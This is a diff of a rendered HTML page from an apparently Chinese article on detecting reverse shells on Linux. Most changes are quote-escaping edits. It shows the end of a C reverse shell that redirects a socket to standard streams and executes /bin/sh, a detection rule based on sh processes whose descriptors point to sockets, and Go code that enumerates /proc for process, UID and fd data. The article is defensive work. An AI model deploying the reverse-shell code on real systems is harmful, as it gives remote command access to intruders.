-<span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">revsockaddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>
 
 <span class="w">    </span><span class="n">connect</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">revsockaddr</span><span class="p">,</span><span class="w"> </span>
 <span class="w">    </span><span class="k">sizeof</span><span class="p">(</span><span class="n">revsockaddr</span><span class="p">));</span>
@@ -312,14 +291,13 @@ openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class
 <span class="w">    </span><span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
 <span class="w">    </span><span class="n">dup2</span><span class="p">(</span><span class="n">sockt</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
 
-<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
-<span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">};</span>
+<span class="w">    </span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
 
 <span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">       </span>
 <span class="p">}</span>
 </code></pre></div>
-
-<p><img alt="agent" src="../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png"></p>
+<p><img alt="agent" class="img-fluid" src="../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png"/></p>
 <p>目标机执行后的结果如下：</p>
 <p>创建了一个常住进程“sh ”， 它的得0和1文件描述符都指向socket。</p>
 <p>匹配规则：sh进程的0，和1文件描述符指向socket</p>
@@ -330,17 +308,17 @@ openssl<span class="w"> </span>s_server<span class="w"> </span>-quiet<span class
 <p>代码例子：
 主要是分析 Linux /proc的内容</p>
 <div class="highlight"><pre><span></span><code>import<span class="w"> </span><span class="o">(</span>
-<span class="w">    </span><span class="s2">&quot;fmt&quot;</span>
-<span class="w">    </span><span class="s2">&quot;io/ioutil&quot;</span>
-<span class="w">    </span><span class="s2">&quot;os&quot;</span>
-<span class="w">    </span><span class="s2">&quot;strconv&quot;</span>
-<span class="w">    </span><span class="s2">&quot;strings&quot;</span>
+<span class="w">    </span><span class="s2">"fmt"</span>
+<span class="w">    </span><span class="s2">"io/ioutil"</span>
+<span class="w">    </span><span class="s2">"os"</span>
+<span class="w">    </span><span class="s2">"strconv"</span>
+<span class="w">    </span><span class="s2">"strings"</span>
 <span class="o">)</span>
 
 func<span class="w"> </span>GetProcessList<span class="o">()</span><span class="w"> </span><span class="o">(</span>resultData<span class="w"> </span><span class="o">[]</span>map<span class="o">[</span>string<span class="o">]</span>string<span class="o">)</span><span class="w"> </span><span class="o">{</span>
 <span class="w">    </span>var<span class="w"> </span><span class="nb">dirs</span><span class="w"> </span><span class="o">[]</span>string
 <span class="w">    </span>var<span class="w"> </span>err<span class="w"> </span>error
-<span class="w">    </span>dirs,<span class="w"> </span><span class="nv">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dirsUnder<span class="o">(</span><span class="s2">&quot;/proc&quot;</span><span class="o">)</span>
+<span class="w">    </span>dirs,<span class="w"> </span><span class="nv">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>dirsUnder<span class="o">(</span><span class="s2">"/proc"</span><span class="o">)</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">||</span><span class="w"> </span>len<span class="o">(</span><span class="nb">dirs</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
 <span class="w">        </span><span class="k">return</span>
 <span class="w">    </span><span class="o">}</span>
@@ -350,58 +328,58 @@ func<span class="w"> </span>GetProcessList<span class="o">()</span><span class="
 <span class="w">            </span><span class="k">continue</span>
 <span class="w">        </span><span class="o">}</span>
 <span class="w">        </span>statusInfo<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>getStatus<span class="o">(</span>pid<span class="o">)</span>
-<span class="w">        </span>ppid,_<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;PPid&quot;</span><span class="o">])</span>
+<span class="w">        </span>ppid,_<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strconv.Atoi<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"PPid"</span><span class="o">])</span>
 <span class="w">        </span>pstatusInfo<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>getStatus<span class="o">(</span>ppid<span class="o">)</span>
 <span class="w">        </span><span class="nb">command</span><span class="w"> </span>:<span class="o">=</span><span class="w"> </span>getcmdline<span class="o">(</span>pid<span class="o">)</span>
 <span class="w">        </span>fd<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>getfd<span class="o">(</span>pid<span class="o">)</span>
 <span class="w">        </span>m<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>make<span class="o">(</span>map<span class="o">[</span>string<span class="o">]</span>string<span class="o">)</span>
-<span class="w">        </span>m<span class="o">[</span><span class="s2">&quot;pid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>v
-<span class="w">        </span>m<span class="o">[</span><span class="s2">&quot;ppid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>statusInfo<span class="o">[</span><span class="s2">&quot;PPid&quot;</span><span class="o">]</span>
-<span class="w">        </span>m<span class="o">[</span><span class="s2">&quot;name&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>statusInfo<span class="o">[</span><span class="s2">&quot;Name&quot;</span><span class="o">]</span>
+<span class="w">        </span>m<span class="o">[</span><span class="s2">"pid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>v
+<span class="w">        </span>m<span class="o">[</span><span class="s2">"ppid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>statusInfo<span class="o">[</span><span class="s2">"PPid"</span><span class="o">]</span>
+<span class="w">        </span>m<span class="o">[</span><span class="s2">"name"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>statusInfo<span class="o">[</span><span class="s2">"Name"</span><span class="o">]</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;uid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;euid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;suid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;fsuid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"uid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"euid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"suid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"fsuid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
 <span class="w">        </span><span class="o">}</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;gid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;egid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;sgid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;fsgid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"gid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"egid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"sgid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"fsgid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>statusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
 <span class="w">        </span><span class="o">}</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w">  </span><span class="o">{</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;puid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;peuid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;psuid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;pfsuid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Uid&quot;</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w">  </span><span class="o">{</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"puid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"peuid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"psuid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"pfsuid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Uid"</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
 <span class="w">        </span><span class="o">}</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;pgid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;pegid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;psgid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
-<span class="w">            </span>m<span class="o">[</span><span class="s2">&quot;pfsgid&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">&quot;Gid&quot;</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>len<span class="o">(</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">]))</span><span class="w"> </span><span class="o">==</span><span class="m">4</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"pgid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">0</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"pegid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">1</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"psgid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">2</span><span class="o">]</span>
+<span class="w">            </span>m<span class="o">[</span><span class="s2">"pfsgid"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span>strings.Fields<span class="o">(</span>pstatusInfo<span class="o">[</span><span class="s2">"Gid"</span><span class="o">])[</span><span class="m">3</span><span class="o">]</span>
 <span class="w">        </span><span class="o">}</span>
 
-<span class="w">        </span>m<span class="o">[</span><span class="s2">&quot;fd&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>fd
-<span class="w">        </span>m<span class="o">[</span><span class="s2">&quot;command&quot;</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">command</span>
+<span class="w">        </span>m<span class="o">[</span><span class="s2">"fd"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>fd
+<span class="w">        </span>m<span class="o">[</span><span class="s2">"command"</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">command</span>
 <span class="w">        </span><span class="nv">resultData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>append<span class="o">(</span>resultData,<span class="w"> </span>m<span class="o">)</span>
 <span class="w">    </span><span class="o">}</span>
 <span class="w">    </span><span class="k">return</span>
 <span class="o">}</span>
 func<span class="w"> </span>getcmdline<span class="o">(</span>pid<span class="w"> </span>int<span class="o">)</span><span class="w"> </span>string<span class="w"> </span><span class="o">{</span>
-<span class="w">    </span>cmdlineFile<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">&quot;/proc/%d/cmdline&quot;</span>,<span class="w"> </span>pid<span class="o">)</span>
+<span class="w">    </span>cmdlineFile<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">"/proc/%d/cmdline"</span>,<span class="w"> </span>pid<span class="o">)</span>
 <span class="w">    </span>cmdlineBytes,<span class="w"> </span>e<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>ioutil.ReadFile<span class="o">(</span>cmdlineFile<span class="o">)</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span>e<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">""</span>
 <span class="w">    </span><span class="o">}</span>
 <span class="w">    </span>cmdlineBytesLen<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>len<span class="o">(</span>cmdlineBytes<span class="o">)</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nv">cmdlineBytesLen</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">""</span>
 <span class="w">    </span><span class="o">}</span>
 <span class="w">    </span><span class="k">for</span><span class="w"> </span>i,<span class="w"> </span>v<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>range<span class="w"> </span>cmdlineBytes<span class="w"> </span><span class="o">{</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nv">v</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
@@ -415,16 +393,16 @@ func<span class="w"> </span>getcmdline<span class="o">(</span>pid<span class="w"
 
 func<span class="w"> </span>getStatus<span class="o">(</span>pid<span class="w"> </span>int<span class="o">)</span><span class="w"> </span><span class="o">(</span>status<span class="w"> </span>map<span class="o">[</span>string<span class="o">]</span>string<span class="o">)</span><span class="w"> </span><span class="o">{</span>
 <span class="w">    </span><span class="nv">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>make<span class="o">(</span>map<span class="o">[</span>string<span class="o">]</span>string<span class="o">)</span>
-<span class="w">    </span>statusFile<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">&quot;/proc/%d/status&quot;</span>,<span class="w"> </span>pid<span class="o">)</span>
+<span class="w">    </span>statusFile<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">"/proc/%d/status"</span>,<span class="w"> </span>pid<span class="o">)</span>
 <span class="w">    </span>var<span class="w"> </span>content<span class="w"> </span><span class="o">[]</span>byte
 <span class="w">    </span>var<span class="w"> </span>err<span class="w"> </span>error
 <span class="w">    </span>content,<span class="w"> </span><span class="nv">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ioutil.ReadFile<span class="o">(</span>statusFile<span class="o">)</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
 <span class="w">        </span><span class="k">return</span>
 <span class="w">    </span><span class="o">}</span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span>_,<span class="w"> </span>line<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>range<span class="w"> </span>strings.Split<span class="o">(</span>string<span class="o">(</span>content<span class="o">)</span>,<span class="w"> </span><span class="s2">&quot;\n&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
-<span class="w">        </span><span class="k">if</span><span class="w"> </span>strings.Contains<span class="o">(</span>line,<span class="w"> </span><span class="s2">&quot;:&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
-<span class="w">            </span>kv<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.SplitN<span class="o">(</span>line,<span class="w"> </span><span class="s2">&quot;:&quot;</span>,<span class="w"> </span><span class="m">2</span><span class="o">)</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span>_,<span class="w"> </span>line<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>range<span class="w"> </span>strings.Split<span class="o">(</span>string<span class="o">(</span>content<span class="o">)</span>,<span class="w"> </span><span class="s2">"\n"</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span>strings.Contains<span class="o">(</span>line,<span class="w"> </span><span class="s2">":"</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span>kv<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.SplitN<span class="o">(</span>line,<span class="w"> </span><span class="s2">":"</span>,<span class="w"> </span><span class="m">2</span><span class="o">)</span>
 <span class="w">            </span>status<span class="o">[</span>kv<span class="o">[</span><span class="m">0</span><span class="o">]]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strings.TrimSpace<span class="o">(</span>kv<span class="o">[</span><span class="m">1</span><span class="o">])</span>
 <span class="w">        </span><span class="o">}</span>
 <span class="w">    </span><span class="o">}</span>
@@ -446,7 +424,7 @@ func<span class="w"> </span>dirsUnder<span class="o">(</span>dirPath<span class=
 <span class="w">    </span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span>:<span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span>&lt;<span class="w"> </span>sz<span class="p">;</span><span class="w"> </span>i++<span class="w"> </span><span class="o">{</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span>fs<span class="o">[</span>i<span class="o">]</span>.IsDir<span class="o">()</span><span class="w"> </span><span class="o">{</span>
 <span class="w">            </span>name<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fs<span class="o">[</span>i<span class="o">]</span>.Name<span class="o">()</span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span>name<span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">&quot;.&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>name<span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">&quot;..&quot;</span><span class="w"> </span><span class="o">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span>name<span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">"."</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>name<span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">".."</span><span class="w"> </span><span class="o">{</span>
 <span class="w">                </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>append<span class="o">(</span>ret,<span class="w"> </span>name<span class="o">)</span>
 <span class="w">            </span><span class="o">}</span>
 <span class="w">        </span><span class="o">}</span>
@@ -456,11 +434,11 @@ func<span class="w"> </span>dirsUnder<span class="o">(</span>dirPath<span class=
 
 
 func<span class="w"> </span>getfd<span class="o">(</span>pid<span class="w"> </span>int<span class="o">)</span><span class="w"> </span>string<span class="w"> </span><span class="o">{</span>
-<span class="w">    </span>fdDir<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">&quot;/proc/%d/fd&quot;</span>,<span class="w"> </span>pid<span class="o">)</span>
+<span class="w">    </span>fdDir<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>fmt.Sprintf<span class="o">(</span><span class="s2">"/proc/%d/fd"</span>,<span class="w"> </span>pid<span class="o">)</span>
 
 <span class="w">    </span>dirs,<span class="w"> </span>err<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>dirsFile<span class="o">(</span>fdDir<span class="o">)</span>
 <span class="w">    </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">||</span><span class="w"> </span>len<span class="o">(</span><span class="nb">dirs</span><span class="o">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">""</span>
 <span class="w">    </span><span class="o">}</span>
 
